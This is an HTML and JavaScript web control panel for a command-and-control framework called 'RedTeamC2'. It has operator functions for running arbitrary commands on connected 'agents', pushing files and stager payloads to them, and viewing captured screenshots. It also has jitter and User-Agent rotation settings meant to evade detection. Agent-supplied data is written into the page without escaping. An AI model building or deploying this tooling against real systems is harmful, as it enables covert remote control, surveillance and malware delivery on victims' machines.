<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RedTeamC2 Futuristic UI</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
    <style>
        /* Futuristic neon-glow theme */
        body {
            background: linear-gradient(120deg, #181c24 0%, #23283a 100%);
            color: #e0e0e0;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        .sidebar {
            position: fixed;
            left: 0; top: 0; bottom: 0;
            width: 220px;
            background: #10131a;
            border-right: 2px solid #00ffe7;
            display: flex;
            flex-direction: column;
            z-index: 10;
            box-shadow: 0 0 32px #00ffe7a0;
            animation: sidebar-glow 2s infinite alternate;
        }
        @keyframes sidebar-glow {
            0% { box-shadow: 0 0 32px #00ffe7a0; }
            100% { box-shadow: 0 0 64px #00ffe7cc; }
        }
        .sidebar h1 {
            font-family: 'Orbitron', sans-serif;
            color: #00ffe7;
            text-align: center;
            margin: 30px 0 20px 0;
            font-size: 2rem;
            letter-spacing: 2px;
            text-shadow: 0 0 8px #00ffe7, 0 0 16px #00ffe7a0;
        }
        .sidebar nav {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-top: 40px;
        }
        .sidebar nav a {
            color: #e0e0e0;
            text-decoration: none;
            font-size: 1.1rem;
            padding: 12px 30px;
            border-left: 4px solid transparent;
            transition: all 0.2s, background 0.5s;
            border-radius: 0 16px 16px 0;
            position: relative;
            overflow: hidden;
        }
        .sidebar nav a.active, .sidebar nav a:hover {
            color: #00ffe7;
            border-left: 4px solid #00ffe7;
            background: linear-gradient(90deg, #23283a 60%, #00ffe720 100%);
            box-shadow: 0 0 16px #00ffe7a0;
        }
        .sidebar nav a:before {
            content: '';
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 0;
            background: #00ffe7;
            opacity: 0.1;
            transition: width 0.3s;
            z-index: -1;
        }
        .sidebar nav a.active:before, .sidebar nav a:hover:before {
            width: 100%;
        }
        .main {
            margin-left: 220px;
            padding: 30px 40px;
            min-height: 100vh;
            background: linear-gradient(120deg, #23283a 0%, #181c24 100%);
            transition: background 0.5s;
            animation: bg-move 10s linear infinite alternate;
        }
        @keyframes bg-move {
            0% { background-position: 0 0; }
            100% { background-position: 100vw 100vh; }
        }
        /* Neon-glow buttons and inputs */
        button, input[type="file"], input[type="text"], input[type="number"], textarea, select {
            background: #181c24;
            border: 1px solid #00ffe7;
            color: #e0e0e0;
            border-radius: 8px;
            padding: 8px 12px;
            font-size: 1rem;
            margin: 4px 0;
            box-shadow: 0 0 8px #00ffe7a0;
            transition: box-shadow 0.2s, border 0.2s;
        }
        button:hover, input[type="file"]:hover, input[type="text"]:hover, input[type="number"]:hover, textarea:focus, select:focus {
            border: 1.5px solid #00ffe7;
            box-shadow: 0 0 16px #00ffe7cc;
            outline: none;
        }
        /* Custom scrollbars */
        ::-webkit-scrollbar {
            width: 10px;
            background: #23283a;
        }
        ::-webkit-scrollbar-thumb {
            background: #00ffe7a0;
            border-radius: 8px;
        }
        /* Animated section transitions */
        .main > div {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
            transition: opacity 0.5s, transform 0.5s;
            position: absolute;
            width: calc(100vw - 260px);
            min-height: 80vh;
            left: 220px;
            top: 80px;
            z-index: 1;
        }
        .main > div[style*='display: block'] {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
            position: relative;
            z-index: 2;
        }
        /* Loading spinner for empty states */
        .spinner {
            border: 4px solid #23283a;
            border-top: 4px solid #00ffe7;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
            display: block;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Responsive grid for agents/files/screenshots */
        .agents-grid, #screenshots-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 30px;
        }
        #files-list, #stager-list {
            margin: 20px 0;
            padding: 0;
            list-style: none;
        }
        #files-list li, #stager-list li {
            background: #23283a;
            border-radius: 10px;
            margin: 8px 0;
            padding: 10px 18px;
            box-shadow: 0 0 8px #00ffe7a0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: box-shadow 0.2s;
        }
        #files-list li:hover, #stager-list li:hover {
            box-shadow: 0 0 16px #00ffe7cc;
        }
        /* Modal overlays for forms and previews */
        .modal {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(24,28,36,0.97);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadein 0.4s;
        }
        @keyframes fadein {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .modal-content {
            background: #23283a;
            border-radius: 16px;
            box-shadow: 0 0 24px #00ffe7a0;
            padding: 32px 40px;
            min-width: 350px;
            max-width: 90vw;
            max-height: 80vh;
            overflow-y: auto;
            color: #e0e0e0;
            position: relative;
        }
        .close-modal {
            position: absolute;
            top: 24px;
            right: 40px;
            font-size: 2rem;
            color: #00ffe7;
            cursor: pointer;
            transition: color 0.2s;
        }
        .close-modal:hover {
            color: #ff007f;
        }
        @media (max-width: 700px) {
            .main { padding: 10px; margin-left: 0; }
            .sidebar { width: 100vw; height: 60px; flex-direction: row; align-items: center; top: unset; left: 0; right: 0; bottom: unset; border-right: none; border-bottom: 2px solid #00ffe7; }
            .sidebar h1 { font-size: 1.2rem; margin: 0 10px; }
            .sidebar nav { flex-direction: row; gap: 10px; margin-top: 0; }
            .main > div { left: 0; width: 100vw; }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h1><i class="fa-solid fa-shield-halved"></i> RedTeamC2</h1>
        <nav>
            <a href="#" class="active" data-section="agents"><i class="fa-solid fa-users"></i> Agents</a>
            <a href="#" data-section="files"><i class="fa-solid fa-file-arrow-up"></i> Files</a>
            <a href="#" data-section="screenshots"><i class="fa-solid fa-image"></i> Screenshots</a>
            <a href="#" data-section="stager"><i class="fa-solid fa-bolt"></i> Stager</a>
            <a href="#" data-section="settings"><i class="fa-solid fa-gear"></i> Settings</a>
        </nav>
    </div>
    <div class="main">
        <div id="agents-section">
            <h2 style="font-family: 'Orbitron', sans-serif; color: #00ffe7;">Agents</h2>
            <div class="agents-grid" id="agents"></div>
            <div id="agents-empty" style="display:none;color:#888;margin-top:20px;">No agents connected.</div>
        </div>
        <div id="files-section" style="display:none">
            <h2>Files</h2>
            <form id="file-upload-form">
                <input type="file" name="file" required>
                <button type="submit">Upload File</button>
            </form>
            <ul id="files-list"></ul>
            <div id="files-empty" style="display:none;color:#888;margin-top:20px;">No files uploaded.</div>
        </div>
        <div id="screenshots-section" style="display:none">
            <h2>Screenshots</h2>
            <div id="screenshots-list"></div>
            <div id="screenshots-empty" style="display:none;color:#888;margin-top:20px;">No screenshots available.</div>
        </div>
        <div id="stager-section" style="display:none">
            <h2>Stager</h2>
            <form id="stager-upload-form">
                <input type="file" name="payload" required>
                <button type="submit">Upload Stager Payload</button>
            </form>
            <ul id="stager-list"></ul>
            <div id="stager-empty" style="display:none;color:#888;margin-top:20px;">No stager payloads uploaded.</div>
            <h3>Send Stager Task</h3>
            <select id="stager-agent-select"></select>
            <select id="stager-payload-select"></select>
            <button onclick="sendStagerTask()">Send Stager</button>
        </div>
        <div id="settings-section" style="display:none">
            <h2>Settings</h2>
            <form onsubmit="saveSettings(event)">
                <label>Jitter Min (s): <input id="jitter-min" type="number" min="1"></label><br>
                <label>Jitter Max (s): <input id="jitter-max" type="number" min="1"></label><br>
                <label>User-Agents (one per line):<br><textarea id="user-agents" rows="4" cols="40"></textarea></label><br>
                <button type="submit">Save Settings</button>
            </form>
        </div>
    </div>
    <div class="results-modal" id="results-modal">
        <div class="results-content">
            <span class="close-modal" onclick="closeModal()">&times;</span>
            <h2>Agent Results</h2>
            <div id="modal-results"></div>
        </div>
    </div>
    <script>
        const socket = io();
        let agentsData = [];
        function renderAgents(agents) {
            agentsData = agents;
            let html = '';
            for (const agent of agents) {
                html += `<div class='agent-card'>
                    <div class='agent-header'><i class="fa-solid fa-user-secret"></i> <span class='agent-id'>${agent.id}</span></div>
                    <div class='agent-sysinfo'><b>Sysinfo:</b> ${agent.sysinfo}</div>
                    <div class='agent-lastseen'><b>Last Seen:</b> ${new Date(agent.last_seen*1000).toLocaleString()}</div>
                    <div class='agent-actions'>
                        <form onsubmit="sendTask(event, '${agent.id}')">
                            <input type='text' name='cmd' placeholder='Command' required/>
                            <button type='submit'><i class="fa-solid fa-terminal"></i> Send Task</button>
                        </form>
                        <form enctype='multipart/form-data' onsubmit="uploadFile(event, '${agent.id}')">
                            <input type='file' name='file' required/>
                            <button type='submit'><i class="fa-solid fa-upload"></i> Upload File</button>
                        </form>
                        <button onclick="showResults('${agent.id}')"><i class="fa-solid fa-list"></i> Show Results</button>
                    </div>
                    <div id='results-${agent.id}'></div>
                </div>`;
            }
            document.getElementById('agents').innerHTML = html;
            document.getElementById('agents-empty').style.display = agents.length ? 'none' : 'block';
        }
        function sendTask(e, agent_id) {
            e.preventDefault();
            const cmd = e.target.cmd.value;
            fetch('/api/task', {method:'POST', body: new URLSearchParams({agent_id, cmd})});
            alert('Task sent!');
        }
        function uploadFile(e, agent_id) {
            e.preventDefault();
            const form = new FormData(e.target);
            form.append('agent_id', agent_id);
            fetch('/api/upload', {method:'POST', body: form});
            alert('File uploaded!');
        }
        function showResults(agent_id) {
            fetch(`/api/results/${agent_id}`).then(r=>r.json()).then(results=>{
                let html = '';
                for (const res of results) html += `<div class='result'>${res}</div>`;
                document.getElementById('modal-results').innerHTML = html;
                document.getElementById('results-modal').classList.add('active');
            });
        }
        function closeModal() {
            document.getElementById('results-modal').classList.remove('active');
        }
        socket.on('agent_update', data => { renderAgents(data.agents); updateStagerAgentSelect(data.agents); });
        socket.on('result_update', data => showResults(data.agent_id));
        fetch('/api/agents').then(r=>r.json()).then(renderAgents);
        // Sidebar navigation
        const sections = ['agents','files','screenshots','stager','settings'];
        function showSection(section) {
            for (const s of sections) {
                document.getElementById(s+'-section').style.display = (s===section)?'block':'none';
                document.querySelector(`.sidebar nav a[data-section="${s}"]`).classList.toggle('active', s===section);
            }
        }
        document.querySelectorAll('.sidebar nav a').forEach(a=>{
            a.onclick = e=>{e.preventDefault();showSection(a.dataset.section);};
        });
        // Files section
        function loadFiles() {
            fetch('/api/files').then(r=>r.json()).then(files=>{
                let html = '';
                for (const f of files) html += `<li>${f} <a href="/uploads/${f}" target="_blank">Download</a> <button onclick="deleteFile('${f}')">Delete</button> <button onclick="sendFileToAgent('${f}')">Send to Agent</button></li>`;
                document.getElementById('files-list').innerHTML = html;
                document.getElementById('files-empty').style.display = files.length ? 'none' : 'block';
            });
        }
        document.getElementById('file-upload-form').onsubmit = function(e) {
            e.preventDefault();
            const form = new FormData(e.target);
            fetch('/api/upload_file', {method:'POST', body:form}).then(()=>loadFiles());
        };
        function deleteFile(f) {
            fetch('/api/delete_file', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:f})}).then(()=>loadFiles());
        }
        function sendFileToAgent(f) {
            const agentId = prompt('Send to which agent ID?');
            if (agentId) fetch('/api/task', {method:'POST',body:new URLSearchParams({agent_id:agentId,cmd:`download|${f}`})});
        }
        // Screenshots section
        function loadScreenshots() {
            fetch('/api/screenshots').then(r=>r.json()).then(shots=>{
                let html = '';
                for (const s of shots) html += `<a href="#" onclick="viewScreenshot('${s}');return false;"><img src="/screenshots/${s}" style="max-width:120px;max-height:90px;margin:6px;border:2px solid #00ffe7;border-radius:8px;box-shadow:0 0 8px #00ffe7a0;"></a> <button onclick="deleteScreenshot('${s}')">Delete</button>`;
                document.getElementById('screenshots-list').innerHTML = html;
                document.getElementById('screenshots-empty').style.display = shots.length ? 'none' : 'block';
            });
        }
        function viewScreenshot(s) {
            const modal = document.createElement('div');
            modal.style.position = 'fixed';modal.style.top=0;modal.style.left=0;modal.style.right=0;modal.style.bottom=0;modal.style.background='rgba(24,28,36,0.95)';modal.style.zIndex=1000;modal.innerHTML = `<img src="/screenshots/${s}" style="max-width:90vw;max-height:80vh;display:block;margin:40px auto;"><button onclick="this.parentNode.remove()" style="display:block;margin:20px auto;">Close</button>`;
            document.body.appendChild(modal);
        }
        function deleteScreenshot(s) {
            fetch('/api/delete_screenshot', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:s})}).then(()=>loadScreenshots());
        }
        // Stager section
        function loadStagerList() {
            fetch('/api/stager_list').then(r=>r.json()).then(list=>{
                let html = '';
                for (const name of list) html += `<li>${name} <button onclick="deleteStager('${name}')">Delete</button></li>`;
                document.getElementById('stager-list').innerHTML = html;
                document.getElementById('stager-empty').style.display = list.length ? 'none' : 'block';
                // update stager payload select
                let sel = document.getElementById('stager-payload-select');
                sel.innerHTML = '';
                for (const name of list) sel.innerHTML += `<option value="${name}">${name}</option>`;
            });
        }
        document.getElementById('stager-upload-form').onsubmit = function(e) {
            e.preventDefault();
            const form = new FormData(e.target);
            fetch('/api/stager_upload', {method:'POST', body:form}).then(()=>loadStagerList());
        };
        function deleteStager(name) {
            fetch('/api/stager_delete', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name})}).then(()=>loadStagerList());
        }
        function sendStagerTask() {
            const agentId = document.getElementById('stager-agent-select').value;
            const payload = document.getElementById('stager-payload-select').value;
            fetch('/api/task', {method:'POST',body:new URLSearchParams({agent_id:agentId,cmd:`stager|${payload}`})});
            alert('Stager task sent!');
        }
        // Update agent select for stager
        function updateStagerAgentSelect(agents) {
            let sel = document.getElementById('stager-agent-select');
            sel.innerHTML = '';
            for (const agent of agents) sel.innerHTML += `<option value="${agent.id}">${agent.id}</option>`;
        }
        // Settings section
        function loadSettings() {
            fetch('/api/settings').then(r=>r.json()).then(s=>{
                document.getElementById('jitter-min').value = s.jitter_min;
                document.getElementById('jitter-max').value = s.jitter_max;
                document.getElementById('user-agents').value = s.user_agents.join('\n');
            });
        }
        function saveSettings(e) {
            e.preventDefault();
            const data = {
                jitter_min: parseInt(document.getElementById('jitter-min').value),
                jitter_max: parseInt(document.getElementById('jitter-max').value),
                user_agents: document.getElementById('user-agents').value.split('\n')
            };
            fetch('/api/settings', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).then(()=>alert('Settings saved!'));
        }
        // On load
        showSection('agents');
        loadFiles();
        loadScreenshots();
        loadStagerList();
        loadSettings();
    </script>
</body>
</html>
